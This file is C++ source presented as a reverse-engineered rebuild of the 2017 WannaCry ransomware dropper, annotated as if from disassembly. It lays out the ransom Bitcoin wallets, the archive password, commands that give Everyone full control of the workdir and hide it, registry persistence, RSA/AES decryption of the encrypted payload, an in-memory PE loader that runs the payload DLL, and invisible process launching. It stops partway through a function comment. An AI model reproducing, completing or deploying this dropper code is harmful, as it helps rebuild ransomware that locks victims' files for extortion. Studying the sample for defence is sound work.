// dropper.cpp — WannaCry.exe, the 2017 WannaCry dropper/installer: copies
// itself to tasksche.exe and registers it as a service, unpacks its toolkit
// from an embedded zip resource, then decrypts t.wnry in-memory with the
// embedded RSA key and runs the payload DLL's TaskStart entry.

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>

// ---------------------------------------------------------------------------
// String/data constants — the dropper's names, formats and fixed parameters
// ---------------------------------------------------------------------------
static const char S_CWNRY[]        = "c.wnry";     // config file read/written by ReadWriteConfig
static const char S_WB[]           = "wb";         // fopen mode: write config
static const char S_RB[]           = "rb";         // fopen mode: read config
static const char S_ADVAPI32[]     = "advapi32.dll";// loaded dynamically for the Crypt* APIs
static const char REG_VAL_WD[]     = "wd";          // registry value holding the workdir path
static const wchar_t REG_KEY_BASE[] = L"Software\\"; // registry key prefix (copied as 20 raw bytes)
static const wchar_t REG_KEY_NAME[] = L"WanaCryPt0r";// appended after the prefix
static const char S_WANACRY[]      = "WANACRY!";   // magic signature at the start of t.wnry
static const wchar_t FMT_DIR_SUB[] = L"%s\\%s";    // path join: <base>\<sub>
static const char S_KERNEL32[]     = "kernel32.dll";// module handle source for GetNativeSystemInfo
// CryptoAPI PRIVATEKEYBLOB, 0x494 bytes (header 07 02 / A4 00 = CALG_RSA_KEYX):
// the embedded RSA-2048 private key. CryptImportKey turns it into the handle
// used to unwrap t.wnry's AES key — this key is what lets researchers decrypt
// the payload offline. Raw bytes sit at file offset 0xEBF8.
static const BYTE RSA_PRIVKEYBLOB[0x494] = { /* file offset 0xEBF8 */ };
static const char RSA_AES_PROVIDER[] =
    "Microsoft Enhanced RSA and AES Cryptographic Provider";   // fallback CSP when the default can't do AES
static const wchar_t FMT_INTEL[]       = L"%s\\Intel";       // candidate workdir under %WINDIR%
static const wchar_t FMT_PROGRAMDATA[] = L"%s\\ProgramData"; // candidate workdir under %WINDIR%
static const char FMT_SVC_PATH[]  = "cmd.exe /c \"%s\"";      // service ImagePath: wraps the exe in cmd.exe
static const char RES_TYPE_XIA[]  = "XIA";                    // resource type holding the embedded zip
static const char *BTC_ADDRS[3] = {                           // the three hardcoded ransom wallets
    "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94",   // one of these is picked at random
    "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw",   // per victim and patched into c.wnry
    "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn",
};
static const char FMT_MUTEX[]    = "%s%d";                    // builds the mutex name (suffix 0)
static const char S_MUTEX[]      = "Global\\MsWinZonesCacheCounterMutexA"; // decoy-looking base name;
                                                              // + "0" => "Global\MsWinZonesCacheCounterMutexA0",
                                                              // created by the payload once it runs
static const char S_TASKSCHE[]   = "tasksche.exe";            // name the dropper copies itself to
static const char S_TASKSTART[]  = "TaskStart";               // export looked up in the decrypted payload
static const char S_TWNRY[]      = "t.wnry";                  // encrypted payload container file
static const char CMD_ICACLS[]   = "icacls . /grant Everyone:F /T /C /Q"; // give Everyone full control of the workdir
static const char CMD_ATTRIB[]   = "attrib +h .";             // hide the workdir
static const char ZIP_PASSWORD[] = "WNcry@2ol7";              // password for the embedded XIA zip
static const char ARG_INSTALL[]  = "/i";                      // argv[1] switch selecting install mode
static const char S_GNSI[]       = "GetNativeSystemInfo";     // resolved to learn the page size (PE loader)

// .data globals written at runtime
static char g_randName[256];          // per-machine service/subdir name from GenRandomName
static DWORD g_zipErr;                // last minizip operation result (error tracking)
static BYTE  g_nullIv[16];            // all-zero IV: t.wnry's payload is AES-CBC with a NULL IV
// Dynamically resolved APIs (kept out of the import table, as in the binary).
static FARPROC g_k32CreateFileW;      // CreateFileW
static FARPROC g_k32WriteFile;        // WriteFile
static FARPROC g_k32ReadFile;         // ReadFile — used by Container_ReadTwnry
static FARPROC g_k32MoveFileW;        // MoveFileW
static FARPROC g_k32MoveFileExW;      // MoveFileExW
static FARPROC g_k32DeleteFileW;      // DeleteFileW
static FARPROC g_k32CloseHandle;      // CloseHandle
typedef BOOL (WINAPI *READFILE_FN)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
// dereference the global slot exactly like the binary's indirect call
#define pfnReadFile (*(READFILE_FN *)&g_k32ReadFile)

static FARPROC g_cryptAcquire;        // 0x40F894 CryptAcquireContextA
static FARPROC g_cryptImportKey;      // 0x40F898
static FARPROC g_cryptDestroyKey;     // 0x40F89C
static FARPROC g_cryptEncrypt;        // 0x40F8A0
static FARPROC g_cryptDecrypt;        // 0x40F8A4
static FARPROC g_cryptGenKey;         // 0x40F8A8
// call prototypes for the dynamic slots (binary calls them through the FARPROC
// data slots, exactly like these casts):
typedef BOOL (WINAPI *CRYPTACQUIRE_FN)(HCRYPTPROV *, LPCSTR, LPCSTR, DWORD, DWORD);
typedef BOOL (WINAPI *CRYPTIMPORT_FN)(HCRYPTPROV, BYTE *, DWORD, HCRYPTKEY,
                                      DWORD, HCRYPTKEY *);
typedef BOOL (WINAPI *CRYPTDESTROY_FN)(HCRYPTKEY);
typedef BOOL (WINAPI *CRYPTDECRYPT_FN)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD,
                                       BYTE *, DWORD *);

// ---------------------------------------------------------------------------
// Pass-through callbacks handed to the in-memory PE loader: VirtualAlloc,
// VirtualFree, LoadLibraryA, GetProcAddress, FreeLibrary — so the loader
// itself needs no imports of its own.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// ResolveAdvapi32 — LoadLibraryA("advapi32.dll"), then GetProcAddress for the
// six Crypt* APIs. All six must resolve or the whole thing fails; success is
// remembered in the globals so this runs only once. (The kernel32 twin,
// ResolveKernel32W, fills the CreateFileW..CloseHandle slots that
// Container_ReadTwnry reads through.)
// ---------------------------------------------------------------------------
__attribute__((unused))   /* resolved as a side effect of ResolveKernel32W */
static int ResolveAdvapi32(void)
{
    if (g_cryptAcquire != NULL) return 1;
    HMODULE h = LoadLibraryA(S_ADVAPI32);
    if (h == NULL) return 0;
    g_cryptAcquire    = GetProcAddress(h, "CryptAcquireContextA");
    g_cryptImportKey  = GetProcAddress(h, "CryptImportKey");
    g_cryptDestroyKey = GetProcAddress(h, "CryptDestroyKey");
    g_cryptEncrypt    = GetProcAddress(h, "CryptEncrypt");
    g_cryptDecrypt    = GetProcAddress(h, "CryptDecrypt");
    g_cryptGenKey     = GetProcAddress(h, "CryptGenKey");
    return (g_cryptAcquire && g_cryptImportKey && g_cryptDestroyKey &&
            g_cryptEncrypt && g_cryptDecrypt && g_cryptGenKey) ? 1 : 0;
}

// ---------------------------------------------------------------------------
// ResolveKernel32W — same pattern for kernel32: CreateFileW/WriteFile/
// ReadFile/MoveFileW/MoveFileExW/DeleteFileW/CloseHandle, all-or-fail.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// CryptSession — small crypto-context object (two instances live inside the
// CryptoContainer). Field offsets shown because the code manipulates them.
// ---------------------------------------------------------------------------
typedef struct {
    DWORD vtUnused;
    HCRYPTPROV hProv;             // +0x04 CSP context handle
    HCRYPTKEY  hKey;              // +0x08 RSA key (imported from the embedded blob)
    HCRYPTKEY  hKey2;             // +0x0C second key slot (unused here)
    CRITICAL_SECTION cs;          // +0x10 serializes decrypt calls
} CryptSession;

int CryptSession_ImportFromFile(CryptSession *s, LPCSTR keyFile);

// CryptSession_Release — destroy both key handles, release the CSP context,
// zero the fields. Safe to call repeatedly.
static int CryptSession_Release(CryptSession *s)
{
    if (s->hKey2  != 0) { ((CRYPTDESTROY_FN)g_cryptDestroyKey)(s->hKey2); s->hKey2 = 0; }
    if (s->hKey   != 0) { ((CRYPTDESTROY_FN)g_cryptDestroyKey)(s->hKey);  s->hKey  = 0; }
    if (s->hProv  != 0) { CryptReleaseContext(s->hProv, 0); s->hProv = 0; }
    return 1;
}

// CryptSession_Acquire — open a PROV_RSA_AES context with
// CRYPT_VERIFYCONTEXT. Tries the user-default provider first, then falls
// back to the named "Microsoft Enhanced RSA and AES" provider (needed on
// systems where the default provider can't handle AES).
static int CryptSession_Acquire(CryptSession *s)
{
    for (int attempt = 0; attempt < 2; attempt++) {
        const char *prov = (attempt == 0) ? NULL : RSA_AES_PROVIDER;
        if (((CRYPTACQUIRE_FN)g_cryptAcquire)(&s->hProv, NULL, prov,
                24 /*PROV_RSA_AES*/, 0xF0000000 /*CRYPT_VERIFYCONTEXT*/))
            return 1;
    }
    return 0;
}

// CryptSession_ImportFromFile — imports a key from a file (read into a
// GlobalAlloc buffer, then CryptImportKey). Only reachable with
// keyFile != NULL — never in this build, since Init is called with 0.

// CryptSession_ImportKey — acquire a CSP context, then either CryptImportKey
// the embedded RSA PRIVATEKEYBLOB (keyFile == NULL — the only path used here)
// or import from a file. On any failure, release everything.
__attribute__((unused))
static int CryptSession_ImportKey(CryptSession *s, LPCSTR keyFile)
{
    if (!CryptSession_Acquire(s))
        goto fail;
    if (keyFile == 0) {
        // import the embedded 0x494-byte RSA private-key blob
        if (((CRYPTIMPORT_FN)g_cryptImportKey)(s->hProv,
                (BYTE *)RSA_PRIVKEYBLOB, 0x494, 0, 0, &s->hKey))
            return 1;
    } else {
        if (CryptSession_ImportFromFile(s, keyFile))
            return 1;
    }
fail:
    CryptSession_Release(s);
    return 0;
}

// CryptSession_Decrypt — RSA-decrypt buf in place under the critical section
// (on entry *pLen is the ciphertext size, on success the plaintext size),
// then copy the result to the caller's output buffer.
static int CryptSession_Decrypt(CryptSession *s, BYTE *buf, DWORD *pLen,
                                BYTE *out, DWORD *pOutLen)
{
    if (s->hKey == 0) return 0;
    EnterCriticalSection(&s->cs);
    if (!((CRYPTDECRYPT_FN)g_cryptDecrypt)(s->hKey, 0, TRUE, 0, buf,
                                           pLen)) {
        LeaveCriticalSection(&s->cs);
        return 0;
    }
    LeaveCriticalSection(&s->cs);
    memcpy(out, buf, *pLen);
    *pOutLen = *pLen;
    return 1;
}

// ---------------------------------------------------------------------------
// AES object — Crypto++-style T-table AES embedded in the dropper. Offsets
// shown because the container references them directly.
// ---------------------------------------------------------------------------
typedef struct {
    DWORD vtUnused;
    int    keyScheduled;          // +0x04 set once the key expansion has run
    DWORD encKeys[60];            // +0x08  forward round-key bank (0x1E0 bytes)
    DWORD decKeys[60];            // +0x1E8 equivalent-inverse (InvMixColumn) bank
    int    blocksize;             // +0x3C8 always 16 here
    int    keysize;               // +0x3CC always 16 here (AES-128)
    BYTE   iv[32];                // +0x3D0 IV copy
    BYTE   chain[32];             // +0x3F0 CBC chain state
    DWORD  keyWords[8];           // +0x414 scratch: big-endian packed key words
} AES;

// ---------------------------------------------------------------------------
// Forward declarations of the summarized third-party pieces: AES round
// functions, the kernel32 API resolver, the loaded-image export lookup,
// minizip archive operations and file-based key import. Their bodies are
// stock library code in the original binary — declared here with external
// linkage on purpose, not re-derived.
// ---------------------------------------------------------------------------
int  CryptSession_ImportFromFile(CryptSession *s, LPCSTR keyFile);
void AES_EncryptBlock(AES *a, const BYTE *in, BYTE *out);
void AES_DecryptBlock(AES *a, const BYTE *in, BYTE *out);
int  ResolveKernel32W(void);
DWORD MemGetProcAddress(HMODULE mod, const char *name);
void *Archive_Ctor(void *src, DWORD size, int mode,
                   const char *password);
DWORD Archive_GetFileInfo(void *z, int index, char *nameOut);
DWORD Archive_Extract(void *z, int index, const char *name,
                      int arg, int mode);
DWORD Archive_CloseAndFree(void *z);
#define ALIGN_UP(v, a)   (((v) + (a) - 1) & ~((a) - 1))
DWORD ComputeImageEnd(BYTE *dll, WORD e_lfanew);
int  CopySections(BYTE *dll, DWORD size, WORD e_lfanew, void *ctx);
int  ProcessRelocsAndFinalize(void *ctx);
void MemFree(void *ctx, void *freeFn, void *freeLibFn, void *user);

static DWORD Te0[256]; static DWORD Te1[256]; static DWORD Te2[256];
static DWORD Te3[256]; static BYTE  Te4[256];
static DWORD Td0[256]; static DWORD Td1[256]; static DWORD Td2[256];
static DWORD Td3[256]; static BYTE  Td4[256];
static BYTE  Rcon[16];
// In the original binary these 256-entry lookup tables are embedded verbatim
// in .rdata; a byte-exact rebuild would dump them from the sample just like
// RSA_PRIVKEYBLOB above.

// AES_EncryptBlock / AES_DecryptBlock — the standard T-table rounds (final
// round substitutes through the Te4/Td4 S-box); summarized, not re-derived.

// AES_XorBlock — XOR src into dst over keysize bytes (the CBC chaining step).
static void AES_XorBlock(AES *a, BYTE *dst, const BYTE *src)
{
    for (int i = 0; i < a->keysize; i++) dst[i] ^= src[i];
}

// AES_SetKey — validate the sizes (16/24/32 only), record key/block size,
// copy the IV into both the IV slot and the CBC chain state, pick the round
// count (10/12/14), zero both key banks, pack the key big-endian, then run
// the standard Rijndael expansion into the forward bank and its
// equivalent-inverse into the decryption bank. t.wnry always arrives here
// with a 16-byte key and the all-zero IV.
static int AES_SetKey(AES *a, const BYTE *key, const BYTE *ivPtr,
                      int keyLen, int blockLen)
{
    if (key == NULL)                                  return 0;
    if (blockLen != 16 && blockLen != 24 && blockLen != 32) return 0;
    if (keyLen   != 16 && keyLen   != 24 && keyLen   != 32) return 0;
    a->keysize   = keyLen;
    a->blocksize = blockLen;
    memcpy(a->iv,    ivPtr, keyLen);
    memcpy(a->chain, ivPtr, keyLen);
    int nr = (keyLen == 16) ? 10 : (keyLen == 24 ? 12 : 14);
    int nk = keyLen / 4;
    memset(a->encKeys, 0, sizeof(a->encKeys));
    memset(a->decKeys, 0, sizeof(a->decKeys));
    for (int i = 0; i < nk; i++)
        a->keyWords[i] = (key[4*i] << 24) | (key[4*i+1] << 16) |
                         (key[4*i+2] << 8) |  key[4*i+3];
    int total = (nr + 1) * nk;
    /* Rcon expansion + InvMixColumn into the decryption bank — summarized */
    (void)total; (void)Te4; (void)Rcon;
    a->keyScheduled = 1;
    return 1;
}

// AES_ProcessData — transform len bytes (must be a multiple of the block
// size): mode 1 = CBC-decrypt, mode 2 = CBC-encrypt, anything else = ECB.
// Mode 1 is the loop that turns t.wnry's ciphertext into the payload DLL:
// decrypt block, XOR with the chain, then fold the ciphertext block into the
// chain for the next round.
static void AES_ProcessData(AES *a, BYTE *buf, BYTE *out, DWORD len, int mode)
{
    int bs = a->blocksize;
    for (DWORD i = 0; i < len / (DWORD)bs; i++) {
        if (mode == 1) {                                            // CBC-decrypt
            AES_DecryptBlock(a, buf, out);
            AES_XorBlock(a, out, a->chain);
            memcpy(a->chain, buf, bs);
        } else if (mode == 2) {                                     // CBC-encrypt
            AES_EncryptBlock(a, a->chain, out);
            AES_XorBlock(a, out, buf);
            memcpy(a->chain, buf, bs);
        } else {
            AES_DecryptBlock(a, buf, out);                          // ECB
        }
        buf += bs; out += bs;
    }
}

// ---------------------------------------------------------------------------
// CryptoContainer — one object bundling everything the t.wnry decrypt needs:
// two CryptSessions, the AES engine and two 1 MiB staging buffers.
// ---------------------------------------------------------------------------
typedef struct {
    DWORD        vtUnused;
    CryptSession sessionA;        // +0x004 holds the embedded RSA private key
    CryptSession sessionB;        // +0x02C second session (only used in file-key mode)
    AES          aes;             // +0x054 AES engine for the payload body
    BYTE        *bufA;            // +0x4C8 1 MiB staging buffer
    BYTE        *bufB;            // +0x4CC 1 MiB staging buffer
    DWORD        param4;          // +0x4D0
    DWORD        param3;          // +0x4D4
} CryptoContainer;

CryptoContainer *Container_Ctor(void);
void Container_Dtor(CryptoContainer *c);
int  Container_Init(CryptoContainer *c, LPCSTR keyFile,
                    DWORD p3, DWORD p4);

// Container_Ctor — allocate and construct the container (two CryptSessions
// plus the AES object).
// Container_Dtor — release both sessions; zero (1 MiB each) and free both
// staging buffers (the Ghidra render showing one shared loop counter is a
// decompiler artifact — the assembly zeroes both fully).
// Container_Init — import the key into sessionA (file-based mode additionally
// imports into sessionB), allocate the two 1 MiB buffers, store the params.
// WinMain always calls Init(0,0,0): embedded-key mode only. */

// ---------------------------------------------------------------------------
// Container_ReadTwnry — read and decrypt t.wnry. File layout (byte offsets):
//   "WANACRY!" magic (8 B) | u32 0x100 @0x8 (RSA blob length) |
//   256-B RSA-wrapped AES key @0xC | u32 unused @0x10C |
//   u64 payload size @0x110 | AES-128-CBC (NULL IV) ciphertext of the
//   payload DLL from @0x118 to EOF
// ---------------------------------------------------------------------------
static BYTE *Container_ReadTwnry(CryptoContainer *c, LPCSTR path,
                                 UINT *outSize)
{
    BYTE key[512];                                                  // receives the unwrapped AES key
    DWORD keyLen = 0;
    BYTE magic[8]; DWORD blobLen, unusedField, read;
    union { unsigned long long u64; DWORD dw[2]; } size;            // payload size, low/high dwords
    LPVOID payload = NULL;
    *outSize = 0;
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    LARGE_INTEGER sz;
    GetFileSizeEx(h, &sz);
    if (sz.HighPart > 0 || (sz.HighPart == 0 && sz.LowPart > 0x6400000))
        goto fail;                                                  // 100 MiB cap
    if (!pfnReadFile(h, magic, 8, &read, NULL) ||
        memcmp(magic, S_WANACRY, 8) != 0)                           // "WANACRY!" magic check
        goto fail;
    if (!pfnReadFile(h, &blobLen, 4, &read, NULL) || blobLen != 0x100)// RSA blob must be exactly 256 B
        goto fail;
    if (!pfnReadFile(h, c->bufA, 0x100, &read, NULL))               // read the wrapped AES key
        goto fail;
    // the 4-byte field @0x10C is read but never used; the payload size is
    // the 8-byte little-endian field @0x110
    if (!pfnReadFile(h, &unusedField, 4, &read, NULL) ||
        !pfnReadFile(h, &size.u64, 8, &read, NULL))
        goto fail;
    // size sanity check: payload must stay under the ~100 MiB cap
    if ((int)size.dw[1] >= 1 ||
        ((int)size.dw[1] >= 0 && size.dw[0] >= 0x6400001))
        goto fail;
    // unwrap the per-build AES key with the embedded RSA-2048 private key
    if (!CryptSession_Decrypt(&c->sessionA, c->bufA, &blobLen,
                              key, &keyLen))
        goto fail;
    // AES key schedule over the unwrapped key, NULL (all-zero) IV
    AES_SetKey(&c->aes, key, g_nullIv, keyLen, 0x10);
    payload = GlobalAlloc(0, size.dw[0]);                           // room for the decrypted DLL
    if (payload == NULL) goto fail;
    if (!pfnReadFile(h, c->bufA, sz.LowPart, &read, NULL) ||
        read == 0 || size.dw[0] > read)                             // ciphertext must cover the claimed size
        goto fail_alloc;
    AES_ProcessData(&c->aes, c->bufA, (BYTE *)payload, read, 1);    // CBC-decrypt into the payload buffer
    *outSize = size.dw[0];
    return (BYTE *)payload;
fail_alloc:
    GlobalFree(payload);
fail:
    return NULL;
}

// ---------------------------------------------------------------------------
// In-memory PE loader — maps the decrypted t.wnry payload (a DLL) into this
// process without touching the filesystem, then runs its entry point.
// ---------------------------------------------------------------------------
typedef struct {                    // 0x3C-byte HeapAlloc'd loader state
    DWORD peHdrRva;                 // [0] e_lfanew of the mapped image
    BYTE *base;                     // [1] allocation base
    HMODULE *imports;               // [2] resolved module handle array
    DWORD    importCount;           // [3]
    int      entryRan;              // [4] DllMain executed
    int      isDll;                 // [5] COFF Characteristics & 0x2000 >> 13
    int      relocDelta;            // [6] applied base delta (or 1 if none)
    void *allocFn, *freeFn, *loadFn, *getProcFn, *freeLibFn, *user; // [7..C]
    int   entryPoint;               // [D]
    DWORD pageSize;                 // [E]
} MemModCtx;

// Loader sub-steps (summarized; bodies not re-derived):
//   CopySections        — map each section's raw data into the allocation
//                         (sections with no raw data get zeroed VirtualSize)
//   FinalizeSections    — merge physically adjacent sections and apply page
//                         protections to the merged ranges
//   ProtectSections     — section characteristics to PAGE_* via the lookup
//                         table {1,8,2,4,0x10,0x80,0x20,0x40}; executable
//                         sections (0x4000000) get |0x200 (NX cleared by the
//                         caller's protect call), discardable (0x02000000)
//                         ranges are MEM_DECOMMITed instead
//   ExecuteTLS          — walk TLS AddressOfCallBacks, call each (base, 1, 0)
//   ProcessRelocs       — apply BASE RELOC HIGHLOW entries (+ base delta)
//   BuildImportTable    — LoadLibraryA each name, resolve by ordinal
//                         (0x80000000 flag) or hint/name
//   MemFree             — DllMain(DETACH), FreeLibrary the imports,
//                         VirtualFree the image, HeapFree the context

// MemLoad_DLL_Core — validate headers, allocate image memory, copy sections,
// relocate, build imports and (for DLLs) run DllMain. An EXE-shaped payload
// only gets its entry point recorded, not called.
static HMODULE MemLoad_DLL_Core(BYTE *dll, DWORD size,
                                void *allocFn, void *freeFn, void *loadFn,
                                void *getProcFn, void *freeLibFn, void *user)
{
    typedef void *(ALLOC_FN)(LPVOID, SIZE_T, DWORD, DWORD, void *);
    typedef BOOL  (FREE_FN)(LPVOID, DWORD, void *);

    if (size < 0x40)                          { SetLastError(0xD);  return NULL; }
    if (*(WORD *)dll != 0x5A4D /*MZ*/)         { SetLastError(0xC1); return NULL; }
    WORD e_lfanewSec = *(WORD *)(dll + 0x3C);
    if (size < (DWORD)(e_lfanewSec + 0xF8))    { SetLastError(0xD);  return NULL; }
    DWORD pe = *(DWORD *)(dll + e_lfanewSec);
    if (pe != 0x00004550 /*PE\0\0*/ ||
        *(WORD *)(dll + e_lfanewSec + 4) != 0x14C /*i386*/ ||
        (*(DWORD *)(dll + e_lfanewSec + 0x38) & 1) == 0 /*executable*/)
                                                                   { SetLastError(0xC1); return NULL; }

    // image end = max over sections of VA + max(VirtSize, rawSize); the page
    // size comes from GetNativeSystemInfo
    DWORD imageEnd = ComputeImageEnd(dll, e_lfanewSec);
    SYSTEM_INFO si;
    FARPROC gnsi = GetProcAddress(GetModuleHandleA(S_KERNEL32), S_GNSI);
    ((void (WINAPI *)(SYSTEM_INFO *))gnsi)(&si);
    DWORD pageSize = si.dwPageSize;
    // require page-aligned SizeOfImage (PE+0x50) == page-aligned imageEnd
    DWORD sizeOfImage = *(DWORD *)(dll + e_lfanewSec + 0x50);
    if (ALIGN_UP(sizeOfImage, pageSize) != ALIGN_UP(imageEnd, pageSize))
                                                                   { SetLastError(0xC1); return NULL; }

    // reserve at the preferred ImageBase (PE+0x34), else anywhere
    LPVOID preferred = (LPVOID)(DWORD_PTR)*(DWORD *)(dll + e_lfanewSec + 0x34);
    BYTE *base = (BYTE *)((ALLOC_FN *)allocFn)(
        preferred, imageEnd,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, user);
    if (base == NULL)
        base = (BYTE *)((ALLOC_FN *)allocFn)(NULL, imageEnd,
               MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, user);     // fallback: any address
    if (base == NULL)                        { SetLastError(0xE);  return NULL; }

    MemModCtx *ctx = (MemModCtx *)HeapAlloc(GetProcessHeap(),
                                            HEAP_ZERO_MEMORY, 0x3C);
    if (ctx == NULL) {
        ((FREE_FN *)freeFn)(base, MEM_RELEASE, user);
        SetLastError(0xE);
        return NULL;
    }
    ctx->base       = base;
    ctx->isDll      = (*(WORD *)(dll + e_lfanewSec + 0x16) &
                       0x2000 /*IMAGE_FILE_DLL*/) >> 13;
    ctx->allocFn = allocFn; ctx->freeFn = freeFn; ctx->loadFn = loadFn;
    ctx->getProcFn = getProcFn; ctx->freeLibFn = freeLibFn; ctx->user = user;
    ctx->pageSize  = pageSize;

    DWORD entryRva;
    if (!CopySections(dll, size, e_lfanewSec, ctx))
        goto fail;
    ctx->peHdrRva = e_lfanewSec;
    *(DWORD *)(base + e_lfanewSec + 0x34) = (DWORD)(DWORD_PTR)base; // patch ImageBase to the real base
    if (!ProcessRelocsAndFinalize(ctx))
        goto fail;

    // AddressOfEntryPoint lives at OptionalHeader+0x10, i.e. e_lfanew + 0x28
    entryRva = *(DWORD *)(base + e_lfanewSec + 0x28);
    if (entryRva == 0) {                                            // no entry point: nothing to run
        ctx->entryPoint = 0;
        return (HMODULE)ctx;
    }
    if (ctx->isDll) {                                               // DLL payload: run DllMain now
        BOOL ok = ((BOOL (WINAPI *)(LPVOID, DWORD, LPVOID))
                   (base + entryRva))(base, DLL_PROCESS_ATTACH, 0);
        if (ok) { ctx->entryRan = 1; return (HMODULE)ctx; }
        SetLastError(0x45A);                                        // ERROR_DLL_INIT_FAILED
        goto fail;
    }
    ctx->entryPoint = (int)(entryRva + (DWORD)(DWORD_PTR)base);
    return (HMODULE)ctx;   /* EXE payload: entry recorded, NOT called */
fail:
    MemFree(ctx, freeFn, freeLibFn, user);
    return NULL;
}

// MemGetProcAddress — walk the loaded image's export directory (PE+0x78).
// A name pointer whose hi-word is 0 means an ordinal index, otherwise a
// case-insensitive name walk; returns RVA + base, SetLastError(0x7F) on miss.

// ---------------------------------------------------------------------------
// Embedded archive layer — minizip + puff/zlib inflate bundled into the
// dropper. Key facts:
//   - The io layer reads straight from memory: the dropper feeds it the raw
//     resource bytes, no temp file is ever written.
//   - The zip core scans backwards for the End-Of-Central-Directory record
//     ("PK\5\6"), parses the central directory, validates the local headers
//     and opens entries with classic ZipCrypto keys initialized to
//     {0x12345678, 0x23456789, 0x34567890} and stirred by the password —
//     that password layer is the ONLY crypto on the archive; the entry data
//     itself is plain deflate.
//   - Extraction writes entries to disk with attributes restored, strips
//     "..\" path components and restores "UT" extra-field timestamps.
// The wrappers below record every result code in g_zipErr.
// ---------------------------------------------------------------------------
static void *UnzOpen_Mem(void *buf, DWORD size, const char *password)
{
    return Archive_Ctor(buf, size, /*mode*/3, password);            // mode 3 = in-memory source
}
static int UnzGetFileInfo(void *z, int index, char *nameOut /*0x124*/)
{
    g_zipErr = Archive_GetFileInfo(z, index, nameOut);
    return g_zipErr;
}
static int UnzExtractFile(void *z, int index, const char *name)
{
    g_zipErr = Archive_Extract(z, index, name, /*arg*/0, /*mode*/2); // mode 2 = write to disk
    return g_zipErr;
}
static int UnzClose(void *z)
{
    g_zipErr = Archive_CloseAndFree(z);
    return g_zipErr;
}

// ---------------------------------------------------------------------------
// ReadWriteConfig — c.wnry is a fixed 0x30C (780) byte config file in the
// workdir; mode 0 writes it, anything else reads it. This is the mechanism
// SetRandomBtcAddr uses to patch the payment address.
// ---------------------------------------------------------------------------
static int ReadWriteConfig(void *buf, int mode)
{
    FILE *f = fopen(S_CWNRY, mode == 0 ? S_WB : S_RB);
    if (f == NULL) return 0;
    size_t ok = (mode == 0) ? fwrite(buf, 0x30C, 1, f)
                            : fread (buf, 0x30C, 1, f);
    fclose(f);
    return ok != 0;
}

// ---------------------------------------------------------------------------
// CreateProcessAndWait — run a command line invisibly (CREATE_NO_WINDOW +
// SW_HIDE). If a timeout is given, kill the child when it doesn't exit in
// time; the exit code is fetched on request.
// ---------------------------------------------------------------------------
static int CreateProcessAndWait(LPCSTR cmdline, DWORD waitMs,
                                LPDWORD exitCode)
{
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    memset(&si, 0, 0x44);
    si.cb = 0x44;
    si.dwFlags    = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;                                       // never show a console
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(NULL, (LPSTR)cmdline, NULL, NULL, FALSE,
                        0x08000000 /*CREATE_NO_WINDOW*/, NULL, NULL,
                        &si, &pi))
        return 0;
    if (waitMs != 0) {
        if (WaitForSingleObject(pi.hProcess, waitMs) != 0)          // timed out: kill it
            TerminateProcess(pi.hProcess, (UINT)-1);
        if (exitCode != NULL)
            GetExitCodeProcess(pi.hProcess, exitCode);
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 1;
}

// ---------------------------------------------------------------------------
// RegistrySetWorkdir — record (or read back) the workdir under
// HKLM\Software\WanaCryPt0r, value "wd" (HKCU as fallback). Mode 0 would cd
// to the stored value, but nothing calls it in this build; mode 1 — the one
// WinMain uses — writes the current directory there so the payload can find
// its files after a service restart.
// ---------------------------------------------------------------------------
static int RegistrySetWorkdir(int mode)
{
    wchar_t subkey[160]; char dir[0x207]; HKEY hk = NULL;
    memcpy(subkey, REG_KEY_BASE, 5 * sizeof(DWORD));  /* 20 B: L"Software\"+NUL */
    wcscat(subkey, REG_KEY_NAME);
    memset(dir, 0, sizeof(dir));
    for (int which = 0; which < 2; which++) {                       // HKLM first, then HKCU
        HKEY root = (which == 0) ? (HKEY)HKEY_LOCAL_MACHINE        // 0x80000002
                                 : (HKEY)HKEY_CURRENT_USER;        // 0x80000001
        hk = NULL;
        if (RegCreateKeyW(root, subkey, &hk) == ERROR_SUCCESS && hk != NULL) {
            LONG r;
            int ok = 0;
            if (mode == 0) {                                        // read "wd" and cd there
                DWORD type, sz = 0x207;
                r = RegQueryValueExA(hk, REG_VAL_WD, NULL, &type,
                                     (BYTE *)dir, &sz);
                if ((ok = (r == 0)) != 0) SetCurrentDirectoryA(dir);
            } else {                                                // write "wd" = current dir
                GetCurrentDirectoryA(0x207, dir);
                r = RegSetValueExA(hk, REG_VAL_WD, 0, REG_SZ,
                                   (BYTE *)dir, strlen(dir) + 1);
                ok = (r == 0);
            }
            RegCloseKey(hk);
            if (ok) return 1;
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// GenRandomName — derive the per-machine install tag used as both the
// service name and the hidden subdirectory name: seed libc rand() with the
// product of the computer-name characters, then emit 8-15 random lower-case
// letters followed by exactly 3 digits (11-18 chars total). Deterministic
// per machine — a re-infection regenerates the same name.
// ---------------------------------------------------------------------------
static void GenRandomName(char *out)
{
    WCHAR name[400]; DWORD n = 399;
    name[0] = L'\0';
    GetComputerNameW(name, &n);
    unsigned seed = 1;
    for (DWORD i = 0; i < wcslen(name); i++)                        // seed = product of name chars
        seed *= (unsigned short)name[i];
    srand(seed);
    int r  = rand();
    int n1 = r % 8 + 8;                                             // 8-15 letters
    int i  = 0;
    for (; i < n1; i++)
        out[i] = (char)(rand() % 0x1a) + 'a';
    for (; i < r % 8 + 0xB; i++)                                    // then exactly 3 digits
        out[i] = (char)(rand() % 10) + '0';
    out[i] = '\0';
}

// ---------------------------------------------------------------------------
// MakeWorkDir — create <base>\<sub>, cd into it, and mark the subdirectory
